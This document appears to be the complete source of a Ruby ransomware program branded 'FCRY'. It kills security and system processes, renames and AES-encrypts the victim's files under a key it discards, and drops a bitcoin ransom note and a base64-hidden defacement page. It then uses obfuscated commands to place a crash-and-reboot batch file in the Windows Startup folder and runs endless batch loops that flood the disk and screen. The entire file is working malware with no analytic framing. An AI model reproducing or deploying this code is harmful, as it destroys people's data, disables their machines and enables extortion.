#/usr/bin/ruby -w 

=begin 
       Powred By T.H.H 
                The Head Hack Team (:
=end
require "base64"
require "openssl"
$btc_adress = "8c64ef4zfae5fa5d51a51d1azd53afe5a5fa5zdaz5d3za3" #Change your bitoin adress

def renfiles()
puts 'File installation ...'
ext = ["exe","txt","rar","zip","jpeg","pl","bmp","JPG","jpg","contact","bat","sql","js","css","php","pdf","dll","pas","rtf","wpd","doc","docx","pptx","ppt","xls","xml","xlam"]
$c = 1
ext.each do |a| 
for i in 1..10
$dd = system("start /min ren *#{a} #{$c}.FCRY")
$c = $c + 1
end
end
end
def Secret 
    msg = "Welcome  To FCRY FAMILY all your files are encrypt with strong keys . why ? your server is infected by the FCRY Malware that 
the attaker can use it to destroy your data Can i recover my files ? yes sure you should only 
pay 100 $ in bitcoin to our official address #{$btc_adress}
     If you dont pay in 24 hour your files will be deletedd 
     If you close or reboot Your Computer will never boot again 

                          ========> PAY TO RECOVER YOUR FILES 
"
base64_html_deface = "CjxodG1sPgoJCjxoZWFkPjx0aXRsZT5vcGlzcmVhbDwvdGl0bGU+PC9oZWFkPgo8Ym9keSBiYWNrZ3JvdW5kPSJodHRwOi8vY2RubWFyLmFsbWF5YWRlZW4ubmV0L2FyY2hpdmUvaW1hZ2UvMjAxOC81LzIzL2ZiMzQ0MWRjLWY1ZDktNGY4Zi1hZTg0LTA4OGY0ZmQxM2YwZS5qcGc/dj0yJnY9MiZ3aWR0aD0xNTAwIi8+PGNlbnRlcj48aDI+T3BzIFlvdXIgQ29tcHV0ZXIgSGFzIGJlZW4gaW5qZWN0ZWQgPGZvbnQgY29sb3I9InJlZCI+I09waXNyZWFsPC9mb250PjwvaDI+PHA+eW91ciBjb21wdXRlciBoYXMgYmVlbiBlbmNyeXB0ZWQgYnkgIEFub255bW91cyBubyBmaWxlcyA8YnI+ZGVsZXRlZCBubyBmaWxlIHN0b2xlbiAgPGJyPiAKPGJyPjxicj48YnI+Cjxmb250IGNvbG9yPSJyZWQiPlsrXTwvZm9udD5TQVZFX1BhbGFzdGluICEgIEhleSBzeXN0ZW0geW91ciBhc3MgaXMgYmVsb25nIHRvIG91cjwvYnI+Cjxmb250IGNvbG9yPSJyZWQiPlsrXTwvZm9udD5XZSB3aWxsIGNvbnRpbnVlIG91ciBhdHRhY2sgb24geW91ciBzZXJ2ZXJzIGJlIHByZXBhcmVkITwvYnI+Cjxmb250IGNvbG9yPSJyZWQiPlsrXTwvZm9udD5XZSB3aWxsIG5vdCBhbmQgd2lsbCBub3QgYmUgdmljdGltcyBvZiB3YXI8L2JyPgo8L2NlbnRlcj48YnI+PGJyPjxicj4KPGJyPgo8YnI+Cjxicj4KPGNlbnRlcj48aW1nIHNyYz0iaHR0cHM6Ly9jZG4udGhld2lyZS5pbi93cC1jb250ZW50L3VwbG9hZHMvMjAxOC8wNS8xMjEzMjgzOS9ETVhKX3J0V0FBWW9pT2guanBnIiB3aWR0aD0iMzAlIi8+IDxpbWcgc3JjPSJodHRwczovL2tvcmFuc3VsaW5kby5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTgvMDUvMDAwXzE0WDJTVi1lMTUyNjM2MTU2Mzg2Ni02NDB4NDAwLmpwZyIgd2lkdGg9IjMxJSIvPjwvY2VudGVyPjxicj4KPGJyPgo8YnI+Cjxicj4KPGJyPgo8YnI+Cjxicj4KPGJyPjxicj4KPGJyPgo8Y2VudGVyPjxoMz5XaGVuIFlvdW5nIGZpZ2h0aW5nIE9mZmljaWFscyBhcmUganVzdCB3YXRjaGluZyAgOig8L2gzPgo8aDQ+U1RPUCBXZSB3aWxsIG5vdCBrbm93IGFzIE9jY3VwaWVkIGNvdW50cnkgIGFueW1vcmU8L2g0Pgo8Y2VudGVyPgo8aWZyYW1lIHNyYz0iaHR0cHM6Ly90aDNwcm9mZXNzaW9uZWwuMDAwd2ViaG9zdGFwcC5jb20vL2N0Zi9ydW5tZS5tcDMiIHdpZHRoPSIwJSIgaGVpZ2h0PSIwJSI+PC9pZnJhbWU+CjwvYm9keT4KPC9odG1sPg=="
msg2 = Base64.decode64(base64_html_deface)
r = File.open("FSCRY_INFECTED.html","w+")
    r.puts msg2
    r.close
    ffgh = File.open("xcrypttttttttt.FCRYYYYYY.bat","w")
    ffgh.puts "
taskkill /f /im csrss.exe
taskkill /f /im winlogon.exe
shutdown /r /t 2
             "
ffgh.close
l = File.open("ff.bat","w")
    l.puts "
:s 
start  FSCRY_INFECTED.html
ping -n 3 127.0.0.1 > NUL
goto s"
l.close
fo = Base64.decode64("Y2QgJXVzZXJwcm9maWxlJVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw")
s =File.open("FSCRYY.txt","w+")
s.puts "#{msg}"
s.close
cmd = Base64.decode64("Y29weSBGU0NSWV9JTkZFQ1RFRC5odG1sICIldXNlcnByb2ZpbGUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAi")
cmd2 = Base64.decode64("Y29weSB4Y3J5cHR0dHR0dHR0dC5GQ1JZWVlZWVkuYmF0ICIldXNlcnByb2ZpbGUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAi")
system("#{cmd} && #{cmd2} ")
system("start FSCRYY.txt")
system("start /min ff.bat")
end
def fucksystem 
program = ["dwm.exe","notepad.exe","cmd.exe","chrome.exe","AvastUI.exe","winlogon.exe","csrss.exe","dwm.exe","IDMan.exe","explorer.exe","uihost.exe","xampp-control.exe","uTorr*","jusched.exe","vpn*","opera.exe"]
program.each do |tas|
system("taskkill /f /im #{tas}")
system("taskkill /f /im taskmgr.exe")
end
end
def bs
    ss = Base64.decode64("Y2QgJXVzZXJwcm9maWxlJVxEZXNrdG9wICYmIGF0dHJpYiAraA==")
    s3 = File.open("run.bat","w+")
s3.puts ss
s3.close
system("start /min run.bat && taskkill /f /im taskmgr.exe")
system("del run.bat")
kk = "
:fgh
mkdir %random%%random%%random%.FCRY
goto fgh
"
rando = File.open("random.bat","w")
rando.puts kk
rando.close
system("start /min random.bat")
end
def crypt_files
cip = OpenSSL::Cipher::AES.new("256-CBC")
cip.encrypt
k = cip.random_key
i = cip.random_iv 
for i in 1..$c
for f in 1..200
if File.file?("#{f}.FCRY") then

d = [""]
h = File.open("#{f}.FCRY","r+")
h.each_line do |fg|
    d << fg
end
res = cip.update("#{d}") + cip.final

w = File.open("#{f}.FCRY","w+")
w.puts res
w.close
end
end
end
end
fucksystem()
renfiles()
Secret()
crypt_files()
bs()
